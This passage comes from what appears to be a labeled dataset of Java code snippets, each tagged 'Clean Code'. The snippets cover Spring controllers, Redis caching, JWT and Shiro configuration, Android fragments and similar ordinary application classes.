    return player.getInventory().getItemStack(oldSlot);
  }
  /** 
 * Gets the ItemStack in the slot the player will hold
 * @return The ItemStack in the final held slot of the player
 */
  public ItemStack getItemInNewSlot(){
    return player.getInventory().getItemStack(newSlot);
  }
  @Override public boolean isCancelled(){
    return cancelled;
  }
  @Override public void setCancelled(  boolean cancel){
    this.cancelled=cancel;
  }
  @Override public @NotNull Player getPlayer(){
    return player;
  }
}
",0,Clean Code
"/** 
 * UmsMemberCacheService实现类 Created by macro on 2020/3/14.
 */
@Service public class UmsMemberCacheServiceImpl implements UmsMemberCacheService {
  @Autowired private RedisService redisService;
  @Value(""${redis.database}"") private String REDIS_DATABASE;
  @Value(""${redis.expire.common}"") private Long REDIS_EXPIRE;
  @Value(""${redis.expire.authCode}"") private Long REDIS_EXPIRE_AUTH_CODE;
  @Value(""${redis.key.member}"") private String REDIS_KEY_MEMBER;
  @Value(""${redis.key.authCode}"") private String REDIS_KEY_AUTH_CODE;
  @Override public void delMember(  Long memberId){
    String key=REDIS_DATABASE + "":"" + REDIS_KEY_MEMBER+ "":""+ memberId;
    redisService.del(key);
  }
  @Override public UmsMember getMember(  Long memberId){
    String key=REDIS_DATABASE + "":"" + REDIS_KEY_MEMBER+ "":""+ memberId;
    return (UmsMember)redisService.get(key);
  }
  @Override public void setMember(  UmsMember member){
    String key=REDIS_DATABASE + "":"" + REDIS_KEY_MEMBER+ "":""+ member.getId();
    redisService.set(key,member,REDIS_EXPIRE);
  }
  @CacheException @Override public void setAuthCode(  String telephone,  String authCode){
    String key=REDIS_DATABASE + "":"" + REDIS_KEY_AUTH_CODE+ "":""+ telephone;
    redisService.set(key,authCode,REDIS_EXPIRE_AUTH_CODE);
  }
  @CacheException @Override public String getAuthCode(  String telephone){
    String key=REDIS_DATABASE + "":"" + REDIS_KEY_AUTH_CODE+ "":""+ telephone;
    return (String)redisService.get(key);
  }
}
",0,Clean Code
"/** 
 * Wrapper class of UserGroupInformation 
 */
private static class UserGroupInformationWrapper {
  private static ReentrantLock globalLock=new ReentrantLock();
  public static UserGroupInformation loginUserFromKeytab(  final Configuration conf,  String user,  String path) throws Exception {
    globalLock.lock();
    try {
      UserGroupInformation.setConfiguration(conf);
      return UserGroupInformation.loginUserFromKeytabAndReturnUGI(user,path);
    }
  finally {
      globalLock.unlock();
    }
  }
  public static UserGroupInformation createProxyUser(  final Configuration conf,  String user) throws Exception {
    globalLock.lock();
    try {
      UserGroupInformation.setLoginUser(null);
      UserGroupInformation.setConfiguration(conf);
      return UserGroupInformation.createProxyUser(user,UserGroupInformation.getLoginUser());
    }
  finally {
      globalLock.unlock();
    }
  }
  public static UserGroupInformation getLoginUser() throws Exception {
    globalLock.lock();
    try {
      UserGroupInformation.setLoginUser(null);
      return UserGroupInformation.getLoginUser();
    }
  finally {
      globalLock.unlock();
    }
  }
}
",0,Clean Code
"/** 
 * <p> 规则核查项信息表 前端控制器 </p>
 * @author AllDataDC
 * @date 2022-11-15
 */
@Api(tags={""规则核查项信息表""}) @RestController @RequestMapping(""/ruleItems"") public class RuleItemController extends BaseController {
  @Autowired private RuleItemService ruleItemService;
  @Autowired private RuleItemMapper ruleItemMapper;
  /** 
 * 通过ID查询信息
 * @param id
 * @return
 */
  @ApiOperation(value=""获取详细信息"",notes=""根据url的id来获取详细信息"") @ApiImplicitParam(name=""id"",value=""ID"",required=true,dataType=""String"",paramType=""path"") @GetMapping(""/{id}"") public R getRuleItemById(  @PathVariable String id){
    RuleItemEntity ruleItemEntity=ruleItemService.getRuleItemById(id);
    return R.ok().setData(ruleItemMapper.toVO(ruleItemEntity));
  }
  @ApiOperation(value=""获取列表"",notes="""") @GetMapping(""/list"") public R getRuleTypeList(  RuleItemQuery ruleItemQuery){
    QueryWrapper<RuleItemEntity> queryWrapper=new QueryWrapper<>();
    queryWrapper.eq(StrUtil.isNotBlank(ruleItemQuery.getRuleTypeId()),""rule_type_id"",ruleItemQuery.getRuleTypeId());
    List<RuleItemEntity> list=ruleItemService.list(queryWrapper);
    return R.ok().setData(list);
  }
  /** 
 * 分页查询信息
 * @param ruleItemQuery
 * @return
 */
  @ApiOperation(value=""分页查询"",notes="""") @ApiImplicitParams({@ApiImplicitParam(name=""ruleItemQuery"",value=""查询实体ruleItemQuery"",required=true,dataTypeClass=RuleItemQuery.class)}) @GetMapping(""/page"") public R getRuleItemPage(  RuleItemQuery ruleItemQuery){
    QueryWrapper<RuleItemEntity> queryWrapper=new QueryWrapper<>();
    queryWrapper.eq(StrUtil.isNotBlank(ruleItemQuery.getRuleTypeId()),""rule_type_id"",ruleItemQuery.getRuleTypeId());
    IPage<RuleItemEntity> page=ruleItemService.page(new Page<>(ruleItemQuery.getPageNum(),ruleItemQuery.getPageSize()),queryWrapper);
    List<RuleItemVo> collect=page.getRecords().stream().map(ruleItemMapper::toVO).collect(Collectors.toList());
    JsonPage<RuleItemVo> jsonPage=new JsonPage<>(page.getCurrent(),page.getSize(),page.getTotal(),collect);
    return R.ok().setData(jsonPage);
  }
}",0,Clean Code
"/** 
 * @author 13
 * @qq交流群 796794009
 * @email 2449207463@qq.com
 * @link http://13blog.site
 */
@Controller @RequestMapping(""/admin"") public class TagController {
  @Resource private TagService tagService;
  @GetMapping(""/tags"") public String tagPage(  HttpServletRequest request){
    request.setAttribute(""path"",""tags"");
    return ""admin/tag"";
  }
  @GetMapping(""/tags/list"") @ResponseBody public Result list(  @RequestParam Map<String,Object> params){
    if (ObjectUtils.isEmpty(params.get(""page"")) || ObjectUtils.isEmpty(params.get(""limit""))) {
      return ResultGenerator.genFailResult(""参数异常！"");
    }
    PageQueryUtil pageUtil=new PageQueryUtil(params);
    return ResultGenerator.genSuccessResult(tagService.getBlogTagPage(pageUtil));
  }
  @PostMapping(""/tags/save"") @ResponseBody public Result save(  @RequestParam(""tagName"") String tagName){
    if (!StringUtils.hasText(tagName)) {
      return ResultGenerator.genFailResult(""参数异常！"");
    }
    if (tagService.saveTag(tagName)) {
      return ResultGenerator.genSuccessResult();
    }
 else {
      return ResultGenerator.genFailResult(""标签名称重复"");
    }
  }
  @PostMapping(""/tags/delete"") @ResponseBody public Result delete(  @RequestBody Integer[] ids){
    if (ids.length < 1) {
      return ResultGenerator.genFailResult(""参数异常！"");
    }
    if (tagService.deleteBatch(ids)) {
      return ResultGenerator.genSuccessResult();
    }
 else {
      return ResultGenerator.genFailResult(""有关联数据请勿强行删除"");
    }
  }
}
",0,Clean Code
"/** 
 * JWT 工具类
 * @www.codesheep.cn 20190312
 */
@Component public class JwtTokenUtil implements Serializable {
  private static final long serialVersionUID=-5625635588908941275L;
  private static final String CLAIM_KEY_USERNAME=""sub"";
  private static final String CLAIM_KEY_CREATED=""created"";
  public String getUsernameFromToken(  String token){
    String username;
    try {
      final Claims claims=getClaimsFromToken(token);
      username=claims.getSubject();
    }
 catch (    Exception e) {
      username=null;
    }
    return username;
  }
  public Date getCreatedDateFromToken(  String token){
    Date created;
    try {
      final Claims claims=getClaimsFromToken(token);
      created=new Date((Long)claims.get(CLAIM_KEY_CREATED));
    }
 catch (    Exception e) {
      created=null;
    }
    return created;
  }
  public Date getExpirationDateFromToken(  String token){
    Date expiration;
    try {
      final Claims claims=getClaimsFromToken(token);
      expiration=claims.getExpiration();
    }
 catch (    Exception e) {
      expiration=null;
    }
    return expiration;
  }
  private Claims getClaimsFromToken(  String token){
    Claims claims;
    try {
      claims=Jwts.parser().setSigningKey(Const.SECRET).parseClaimsJws(token).getBody();
    }
 catch (    Exception e) {
      claims=null;
    }
    return claims;
  }
  private Date generateExpirationDate(){
    return new Date(System.currentTimeMillis() + Const.EXPIRATION_TIME * 1000);
  }
  private Boolean isTokenExpired(  String token){
    final Date expiration=getExpirationDateFromToken(token);
    return expiration.before(new Date());
  }
  private Boolean isCreatedBeforeLastPasswordReset(  Date created,  Date lastPasswordReset){
    return (lastPasswordReset != null && created.before(lastPasswordReset));
  }
  public String generateToken(  UserDetails userDetails){
    Map<String,Object> claims=new HashMap<>();
    claims.put(CLAIM_KEY_USERNAME,userDetails.getUsername());
    claims.put(CLAIM_KEY_CREATED,new Date());
    return generateToken(claims);
  }
  String generateToken(  Map<String,Object> claims){
    return Jwts.builder().setClaims(claims).setExpiration(generateExpirationDate()).signWith(SignatureAlgorithm.HS512,Const.SECRET).compact();
  }
  public Boolean canTokenBeRefreshed(  String token){
    return !isTokenExpired(token);
  }
  public String refreshToken(  String token){
    String refreshedToken;
    try {
      final Claims claims=getClaimsFromToken(token);
      claims.put(CLAIM_KEY_CREATED,new Date());
      refreshedToken=generateToken(claims);
    }
 catch (    Exception e) {
      refreshedToken=null;
    }
    return refreshedToken;
  }
  public Boolean validateToken(  String token,  UserDetails userDetails){
    User user=(User)userDetails;
    final String username=getUsernameFromToken(token);
    return (username.equals(user.getUsername()) && !isTokenExpired(token));
  }
}
",0,Clean Code
"public abstract class ProgressFragment extends Fragment {
  private View loadingView;
  private View emptyView;
  private View contentView;
  @Nullable @Override public View onCreateView(  @NonNull LayoutInflater inflater,  @Nullable ViewGroup container,  @Nullable Bundle savedInstanceState){
    View view=inflater.inflate(R.layout.progress_fragment,container,false);
    ViewStub loadingViewStub=view.findViewById(R.id.loadingViewStub);
    ViewStub contentViewStub=view.findViewById(R.id.contentViewStub);
    ViewStub emtpyViewStub=view.findViewById(R.id.emptyViewStub);
    loadingViewStub.setLayoutResource(loadingLayout());
    loadingView=loadingViewStub.inflate();
    contentViewStub.setLayoutResource(contentLayout());
    contentView=contentViewStub.inflate();
    contentView.setVisibility(View.GONE);
    emtpyViewStub.setLayoutResource(emptyLayout());
    emptyView=emtpyViewStub.inflate();
    emptyView.setVisibility(View.GONE);
    afterViews(view);
    return view;
  }
  protected abstract int contentLayout();
  protected int loadingLayout(){
    return R.layout.loading_view;
  }
  protected int emptyLayout(){
    return R.layout.empty_view;
  }
  protected void showContent(){
    if (contentView.getVisibility() == View.VISIBLE) {
      return;
    }
    loadingView.setVisibility(View.GONE);
    contentView.setVisibility(View.VISIBLE);
    emptyView.setVisibility(View.GONE);
  }
  protected void showLoading(){
    if (loadingView.getVisibility() == View.VISIBLE) {
      return;
    }
    loadingView.setVisibility(View.VISIBLE);
    contentView.setVisibility(View.GONE);
    emptyView.setVisibility(View.GONE);
  }
  protected void showEmpty(  String desc){
    if (emptyView.getVisibility() == View.VISIBLE) {
      return;
    }
    TextView emptyTextView=emptyView.findViewById(R.id.emptyTextView);
    if (emptyTextView != null) {
      emptyTextView.setText(desc);
    }
    emptyView.setVisibility(View.VISIBLE);
    contentView.setVisibility(View.GONE);
    loadingView.setVisibility(View.GONE);
  }
  protected void afterViews(  View view){
  }
}
",0,Clean Code
"/** 
 * Override resolved schema as there is a custom serializer that converts the data to a map before serializing it.
 * @author bnasslahsen
 * @see org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer
 * @see org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection,JsonGenerator,SerializerProvider) org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection, JsonGenerator, SerializerProvider)org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection, JsonGenerator, SerializerProvider)org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection, JsonGenerator, SerializerProvider)org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection, JsonGenerator, SerializerProvider)org.springframework.hateoas.mediatype.hal.Jackson2HalModule.HalResourcesSerializer#serialize(Collection, JsonGenerator, SerializerProvider)
 */
public class CollectionModelContentConverter implements ModelConverter {
  /** 
 * The Link relation provider.
 */
  private final LinkRelationProvider linkRelationProvider;
  /** 
 * Instantiates a new Collection model content converter.
 * @param linkRelationProvider the link relation provider
 */
  public CollectionModelContentConverter(  LinkRelationProvider linkRelationProvider){
    this.linkRelationProvider=linkRelationProvider;
  }
  @Override public Schema<?> resolve(  AnnotatedType type,  ModelConverterContext context,  Iterator<ModelConverter> chain){
    if (chain.hasNext() && type != null && type.getType() instanceof CollectionType && ""_embedded"".equalsIgnoreCase(type.getPropertyName())) {
      Schema<?> schema=chain.next().resolve(type,context,chain);
      if (schema instanceof ArraySchema) {
        Class<?> entityType=getEntityType(type);
        String entityClassName=linkRelationProvider.getCollectionResourceRelFor(entityType).value();
        return new ObjectSchema().name(""_embedded"").addProperties(entityClassName,schema);
      }
    }
    return chain.hasNext() ? chain.next().resolve(type,context,chain) : null;
  }
  /** 
 * Gets entity type.
 * @param type the type
 * @return the entity type
 */
  private Class<?> getEntityType(  AnnotatedType type){
    Class<?> containerEntityType=((CollectionType)(type.getType())).getContentType().getRawClass();
    if (EntityModel.class.isAssignableFrom(containerEntityType)) {
      TypeBindings typeBindings=((CollectionType)type.getType()).getContentType().getBindings();
      if (!CollectionUtils.isEmpty(typeBindings.getTypeParameters()))       return typeBindings.getBoundType(0).getRawClass();
    }
    return containerEntityType;
  }
}
",0,Clean Code
"private class AppendBatcher {
  List<StableClosure> storage;
  int cap;
  int size;
  int bufferSize;
  List<LogEntry> toAppend;
  LogId lastId;
  public AppendBatcher(  final List<StableClosure> storage,  final int cap,  final List<LogEntry> toAppend,  final LogId lastId){
    super();
    this.storage=storage;
    this.cap=cap;
    this.toAppend=toAppend;
    this.lastId=lastId;
  }
  LogId flush(){
    if (this.size > 0) {
      this.lastId=appendToStorage(this.toAppend);
      for (int i=0; i < this.size; i++) {
        this.storage.get(i).getEntries().clear();
        Status st=null;
        try {
          if (LogManagerImpl.this.hasError) {
            st=new Status(RaftError.EIO,""Corrupted LogStorage"");
          }
 else {
            st=Status.OK();
          }
          this.storage.get(i).run(st);
        }
 catch (        Throwable t) {
          LOG.error(""Fail to run closure with status: {}."",st,t);
        }
      }
      this.toAppend.clear();
      this.storage.clear();
    }
    this.size=0;
    this.bufferSize=0;
    return this.lastId;
  }
  void append(  final StableClosure done){
    if (this.size == this.cap || this.bufferSize >= LogManagerImpl.this.raftOptions.getMaxAppendBufferSize()) {
      flush();
    }
    this.storage.add(done);
    this.size++;
    this.toAppend.addAll(done.getEntries());
    for (    final LogEntry entry : done.getEntries()) {
      this.bufferSize+=entry.getData() != null ? entry.getData().remaining() : 0;
    }
  }
}",0,Clean Code
"public class BlueMapWorldImpl implements BlueMapWorld {
  private final String id;
  private final WeakReference<World> world;
  private final WeakReference<BlueMapService> blueMapService;
  private final WeakReference<Plugin> plugin;
  public BlueMapWorldImpl(  World world,  BlueMapService blueMapService,  @Nullable Plugin plugin){
    this.id=world.getId();
    this.world=new WeakReference<>(world);
    this.blueMapService=new WeakReference<>(blueMapService);
    this.plugin=new WeakReference<>(plugin);
  }
  @Override public String getId(){
    return id;
  }
  @Override @Deprecated public Path getSaveFolder(){
    World world=unpack(this.world);
    if (world instanceof MCAWorld) {
      return ((MCAWorld)world).getDimensionFolder();
    }
 else {
      throw new UnsupportedOperationException(""This world-type has no save-folder."");
    }
  }
  @Override public Collection<BlueMapMap> getMaps(){
    World world=unpack(this.world);
    return unpack(blueMapService).getMaps().values().stream().filter(map -> map.getWorld().equals(world)).map(map -> new BlueMapMapImpl(map,this,plugin.get())).collect(Collectors.toUnmodifiableSet());
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    BlueMapWorldImpl that=(BlueMapWorldImpl)o;
    return id.equals(that.id);
  }
  @Override public int hashCode(){
    return id.hashCode();
  }
  private <T>T unpack(  WeakReference<T> ref){
    return Objects.requireNonNull(ref.get(),""Reference lost to delegate object. Most likely BlueMap got reloaded and this instance is no longer valid."");
  }
  /** 
 * Easy-access method for addons depending on BlueMapCore:<br> <blockquote><pre> World world = ((BlueMapWorldImpl) blueMapWorld).world(); </pre></blockquote>
 */
  public World world(){
    return unpack(world);
  }
}
",0,Clean Code
"public static class Case extends UseCase {
  @Override public String getName(){
    return ""代码添加fragment相关测试"";
  }
  @Override public String getSummary(){
    return ""测试通过代码添加一个fragment"";
  }
  @Override public Class getPageClass(){
    return TestDynamicFragmentActivity.class;
  }
}
public static class Case extends UseCase {
  @Override public String getName(){
    return ""DialogFragment相关测试"";
  }
  @Override public String getSummary(){
    return ""测试DialogFragment使用setWindowAnimations"";
  }
  @Override public Class getPageClass(){
    return TestDialogFragmentActivity.class;
  }
}
public static class Case extends UseCase {
  @Override public String getName(){
    return ""xml中使用fragment相关测试"";
  }
  @Override public String getSummary(){
    return ""测试在Activity现实xml中定义的fragment"";
  }
  @Override public Class getPageClass(){
    return TestXmlFragmentActivity.class;
  }
}
",0,Clean Code
"/** 
 * This example of mica http
 * @author L.cm
 */
@Slf4j public class HttpRequestDemo {
  public void doc(){
    HttpRequest.setGlobalLog(LogLevel.BODY);
    HttpRequest.setGlobalLog(HttpLogger.Console,LogLevel.BODY);
    HttpRequest.setGlobalLog(log::info);
    HttpRequest.get(""https://www.baidu.com"").useSlf4jLog().addHeader(""x-account-id"",""mica001"").addCookie(new Cookie.Builder().name(""sid"").value(""mica_user_001"").build()).query(""q"",""mica"").queryEncoded(""name"",""encodedValue"").formBuilder().add(""id"",123123).execute().asJsonNode();
    String html=HttpRequest.post(""https://www.baidu.com"").execute().onSuccess(ResponseSpec::asString);
    String text=HttpRequest.patch(""https://www.baidu.com"").execute().onSuccess(ResponseSpec::asString);
    HttpRequest.delete(""https://www.baidu.com"").async().onFailed((request,e) -> {
      e.printStackTrace();
    }
).onSuccessful(responseSpec -> {
      JsonNode jsonNode=responseSpec.asJsonNode();
    }
);
  }
  public static void main(  String[] args){
    HttpRequest.setGlobalLog(LogLevel.BODY);
    String html=HttpRequest.get(""https://www.baidu.com"").connectTimeout(Duration.ofSeconds(1000)).query(""test"",""a"").query(""name"",""張三"").query(""x"",1).query(""abd"",Base64Util.encode(""123&$#%"")).queryEncoded(""abc"",Base64Util.encode(""123&$#%"")).execute().onFailed(((request,e) -> {
      e.printStackTrace();
    }
)).onSuccess(ResponseSpec::asString);
    System.out.println(html);
    Optional<String> opt=HttpRequest.post(URI.create(""https://www.baidu.com"")).bodyString(""Important stuff"").formBuilder().add(""a"",""b"").execute().onSuccessOpt(ResponseSpec::asString);
    HttpRequest.post(""https://www.baidu.com/some-form"").addHeader(""X-Custom-header"",""stuff"").execute().onFailed((request,e) -> {
      e.printStackTrace();
    }
).onSuccessful(ResponseSpec::asString);
    HttpRequest.get(""https://www.baidu.com/some-form"").async().onFailed((request,e) -> {
      e.printStackTrace();
    }
).onSuccessful(System.out::println);
  }
}
",0,Clean Code
"/** 
 * {@code SimpleTokenizer} is an implementation of the {@link Tokenizer} interface that convertssentences into token by splitting them by a given delimiter.
 */
public class SimpleTokenizer implements Tokenizer {
  private String delimiter="" "";
  /** 
 * Creates an instance of  {@code SimpleTokenizer} with the given delimiter.
 * @param delimiter the delimiter
 */
  public SimpleTokenizer(  String delimiter){
    this.delimiter=delimiter;
  }
  /** 
 * Creates an instance of  {@code SimpleTokenizer} with the default delimiter ("" ""). 
 */
  public SimpleTokenizer(){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public List<String> tokenize(  String sentence){
    return Arrays.asList(sentence.split(delimiter));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String buildSentence(  List<String> tokens){
    return String.join(delimiter,tokens);
  }
}
",0,Clean Code
"@Configuration public class ShiroConfig {
  @Bean public ShiroFilterFactoryBean shiroFilterFactoryBean(  SecurityManager securityManager){
    ShiroFilterFactoryBean shiroFilterFactoryBean=new ShiroFilterFactoryBean();
    shiroFilterFactoryBean.setSecurityManager(securityManager);
    LinkedHashMap<String,Filter> filters=new LinkedHashMap<>();
    filters.put(""jwt"",new JWTFilter());
    shiroFilterFactoryBean.setFilters(filters);
    LinkedHashMap<String,String> filterChainDefinitionMap=new LinkedHashMap<>();
    filterChainDefinitionMap.put(""/actuator/**"",""anon"");
    filterChainDefinitionMap.put(""/h2-console/**"",""anon"");
    filterChainDefinitionMap.put(""/doc.html"",""anon"");
    filterChainDefinitionMap.put(""/swagger-ui.html"",""anon"");
    filterChainDefinitionMap.put(""/swagger-ui/**"",""anon"");
    filterChainDefinitionMap.put(""/swagger-resources/**"",""anon"");
    filterChainDefinitionMap.put(""/v3/api-docs/**"",""anon"");
    filterChainDefinitionMap.put(""/webjars/**"",""anon"");
    filterChainDefinitionMap.put(""/passport/**"",""anon"");
    filterChainDefinitionMap.put(""/systemName"",""anon"");
    filterChainDefinitionMap.put(""/member/teams"",""anon"");
    filterChainDefinitionMap.put(""/user/check/**"",""anon"");
    filterChainDefinitionMap.put(""/user/initTeam"",""anon"");
    filterChainDefinitionMap.put(""/websocket/**"",""anon"");
    filterChainDefinitionMap.put(""/metrics/**"",""anon"");
    filterChainDefinitionMap.put(""/index.html"",""anon"");
    filterChainDefinitionMap.put(""/assets/**"",""anon"");
    filterChainDefinitionMap.put(""/resource/**/**"",""anon"");
    filterChainDefinitionMap.put(""/css/**"",""anon"");
    filterChainDefinitionMap.put(""/fonts/**"",""anon"");
    filterChainDefinitionMap.put(""/img/**"",""anon"");
    filterChainDefinitionMap.put(""/js/**"",""anon"");
    filterChainDefinitionMap.put(""/loading/**"",""anon"");
    filterChainDefinitionMap.put(""/*.js"",""anon"");
    filterChainDefinitionMap.put(""/*.png"",""anon"");
    filterChainDefinitionMap.put(""/*.jpg"",""anon"");
    filterChainDefinitionMap.put(""/*.less"",""anon"");
    filterChainDefinitionMap.put(""/*.ico"",""anon"");
    filterChainDefinitionMap.put(""/"",""anon"");
    filterChainDefinitionMap.put(""/proxy/**"",""anon"");
    filterChainDefinitionMap.put(""/**"",""jwt"");
    shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);
    return shiroFilterFactoryBean;
  }
  @Bean public SecurityManager securityManager(){
    DefaultWebSecurityManager securityManager=new DefaultWebSecurityManager();
    securityManager.setRealm(shiroRealm());
    return securityManager;
  }
  @Bean public ShiroRealm shiroRealm(){
    return new ShiroRealm();
  }
  @Bean public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor(  SecurityManager securityManager){
    AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor=new AuthorizationAttributeSourceAdvisor();
    authorizationAttributeSourceAdvisor.setSecurityManager(securityManager);
    return authorizationAttributeSourceAdvisor;
  }
}
",0,Clean Code
"/** 
 * {@code MxEngineProvider} is the MXNet implementation of {@link EngineProvider}. 
 */
public class MxEngineProvider implements EngineProvider {
  /** 
 * {@inheritDoc} 
 */
  @Override public String getEngineName(){
    return MxEngine.ENGINE_NAME;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int getEngineRank(){
    String osName=System.getProperty(""os.name"");
    String osArch=System.getProperty(""os.arch"");
    if (osName.startsWith(""Mac"") && ""aarch64"".equals(osArch)) {
      return 99;
    }
    return MxEngine.RANK;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Engine getEngine(){
    return InstanceHolder.INSTANCE;
  }
private static class InstanceHolder {
    static final Engine INSTANCE=MxEngine.newInstance();
  }
}
",0,Clean Code
"/** 
 * @author subhro
 */
public class DarkTerminalTheme implements TerminalTheme {
  private String name;
  public static final int DEF_FG=0xc8c8c8, DEF_BG=0x282c34, SEL_FG=0xe6e6e6, SEL_BG=0x039be5, FIND_FG=0xe6e6e6, FIND_BG=0x4d525e, HREF_FG=0xf0f0f0, HREF_BG=0x282c34;
  /** 
 */
  public static final TerminalColor getTerminalColor(  int rgb){
    return TerminalColor.awt(new Color(rgb));
  }
  @Override public String getName(){
    return name;
  }
  @Override public TextStyle getDefaultStyle(){
    return new TextStyle(getTerminalColor(DEF_FG),getTerminalColor(DEF_BG));
  }
  @Override public TextStyle getSelectionColor(){
    return new TextStyle(getTerminalColor(SEL_FG),getTerminalColor(SEL_BG));
  }
  @Override public TextStyle getFoundPatternColor(){
    return new TextStyle(getTerminalColor(FIND_FG),getTerminalColor(FIND_BG));
  }
  @Override public TextStyle getHyperlinkColor(){
    return new TextStyle(getTerminalColor(HREF_FG),getTerminalColor(HREF_BG));
  }
  @Override public String toString(){
    return ""Dark"";
  }
}
",0,Clean Code
"class ChatMultimediaRecorderImpl extends IMultimediaRecorder {
  @Override public void openRecorder(  ActivityResultCaller activityResultCaller,  MultimediaRecorderListener listener){
    if (listener == null) {
      return;
    }
    Bundle bundle=new Bundle();
    bundle.putInt(TUIChatConstants.CAMERA_TYPE,CameraActivity.BUTTON_STATE_ONLY_RECORDER);
    TUICore.startActivityForResult(activityResultCaller,CameraActivity.class,bundle,result -> {
      Intent data=result.getData();
      if (data == null) {
        listener.onFailed(-1,""record failed"");
        return;
      }
      Uri uri=data.getData();
      if (uri != null) {
        listener.onSuccess(uri);
        return;
      }
      listener.onFailed(-1,""record failed"");
    }
);
  }
  public void openCamera(  ActivityResultCaller activityResultCaller,  MultimediaRecorderListener listener){
    if (listener == null) {
      return;
    }
    Bundle bundle=new Bundle();
    bundle.putInt(TUIChatConstants.CAMERA_TYPE,CameraActivity.BUTTON_STATE_ONLY_CAPTURE);
    TUICore.startActivityForResult(activityResultCaller,CameraActivity.class,bundle,result -> {
      if (result.getData() != null) {
        Uri uri=result.getData().getData();
        if (uri != null) {
          listener.onSuccess(uri);
          return;
        }
      }
      listener.onFailed(-1,""take photo failed"");
    }
);
  }
}",0,Clean Code
"/** 
 * An interface containing Gson constants. 
 */
public interface JsonUtils {
  boolean PRETTY_PRINT=Boolean.parseBoolean(Utils.getEnvOrSystemProperty(""DJL_PRETTY_PRINT""));
  Gson GSON=builder().create();
  Gson GSON_COMPACT=builder(false).create();
  Gson GSON_PRETTY=builder(true).create();
  Type LIST_TYPE=new TypeToken<List<String>>(){
  }
.getType();
  /** 
 * Returns a custom  {@code GsonBuilder} instance.
 * @return a custom {@code GsonBuilder} instance.
 */
  static GsonBuilder builder(){
    return builder(PRETTY_PRINT);
  }
  /** 
 * Returns a custom  {@code GsonBuilder} instance.
 * @param prettyPrint true for pretty print
 * @return a custom {@code GsonBuilder} instance.
 */
  static GsonBuilder builder(  boolean prettyPrint){
    GsonBuilder builder=new GsonBuilder().setDateFormat(""yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"").serializeSpecialFloatingPointValues().registerTypeHierarchyAdapter(JsonSerializable.class,new JsonSerializable.Serializer()).registerTypeAdapter(Double.class,(JsonSerializer<Double>)(src,t,ctx) -> {
      long v=src.longValue();
      if (src.equals(Double.valueOf(String.valueOf(v)))) {
        return new JsonPrimitive(v);
      }
      return new JsonPrimitive(src);
    }
);
    if (prettyPrint) {
      builder.setPrettyPrinting();
    }
    return builder;
  }
  /** 
 * Serializes the specified object into its equivalent JSON representation.
 * @param src the source object
 * @return the json string
 */
  static String toJson(  Object src){
    return GSON.toJson(src);
  }
}
",0,Clean Code
"/** 
 * Report processor. <ul> <li>Reports content or users (/report), POST</li> </ul>
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Feb 11, 2020
 * @since 3.1.0
 */
@Singleton public class ReportProcessor {
  /** 
 * Logger.
 */
  private static final Logger LOGGER=LogManager.getLogger(ReportProcessor.class);
  /** 
 * Report management service.
 */
  @Inject private ReportMgmtService reportMgmtService;
  /** 
 * Language service.
 */
  @Inject private LangPropsService langPropsService;
  /** 
 * Reports content or users.
 * @param context the specified context
 */
  public void report(  final RequestContext context){
    context.renderJSON(StatusCodes.ERR);
    final JSONObject requestJSONObject=context.requestJSON();
    final JSONObject currentUser=Sessions.getUser();
    final String userId=currentUser.optString(Keys.OBJECT_ID);
    final String dataId=requestJSONObject.optString(Report.REPORT_DATA_ID);
    final int dataType=requestJSONObject.optInt(Report.REPORT_DATA_TYPE);
    final int type=requestJSONObject.optInt(Report.REPORT_TYPE);
    final String memo=StringUtils.trim(requestJSONObject.optString(Report.REPORT_MEMO));
    final JSONObject report=new JSONObject();
    report.put(Report.REPORT_USER_ID,userId);
    report.put(Report.REPORT_DATA_ID,dataId);
    report.put(Report.REPORT_DATA_TYPE,dataType);
    report.put(Report.REPORT_TYPE,type);
    report.put(Report.REPORT_MEMO,memo);
    try {
      reportMgmtService.addReport(report);
      context.renderJSONValue(Keys.CODE,StatusCodes.SUCC);
    }
 catch (    final ServiceException e) {
      context.renderMsg(e.getMessage());
      context.renderJSONValue(Keys.CODE,StatusCodes.ERR);
    }
catch (    final Exception e) {
      LOGGER.log(Level.ERROR,""Adds a report failed"",e);
      context.renderMsg(langPropsService.get(""systemErrLabel""));
      context.renderJSONValue(Keys.CODE,StatusCodes.ERR);
    }
  }
}
",0,Clean Code
"/** 
 * Provide a complete state of the condition evaluation of a component.
 * @author Stephane Nicoll
 */
public class ConditionEvaluationState {
  private final Conditions conditions;
  private final Map<ConfigurationPhase,ConditionEvaluation> recordedEvaluations=new LinkedHashMap<>();
  ConditionEvaluationState(  Conditions conditions){
    this.conditions=conditions;
  }
  /** 
 * Record the  {@link ConditionEvaluation} for the specified {@link ConfigurationPhase phase}.
 * @param requiredPhase the required phase
 * @param conditionEvaluation the evaluation for that phase
 * @throws IllegalStateException if an evaluation already exists for that phase
 */
  void recordConditionEvaluation(  ConfigurationPhase requiredPhase,  ConditionEvaluation conditionEvaluation){
    ConditionEvaluation existing=this.recordedEvaluations.putIfAbsent(requiredPhase,conditionEvaluation);
    if (existing != null) {
      throw new IllegalStateException(""Conditions evaluation for phase "" + requiredPhase + "" already recorded."");
    }
  }
  /** 
 * Return the  {@link Conditions conditions} of this instance
 * @return the conditions
 */
  public Conditions getConditions(){
    return this.conditions;
  }
  /** 
 * Return the  {@link ConditionEvaluation} for the specified {@link ConfigurationPhase phase}.
 * @param phase the configuration phase of interest
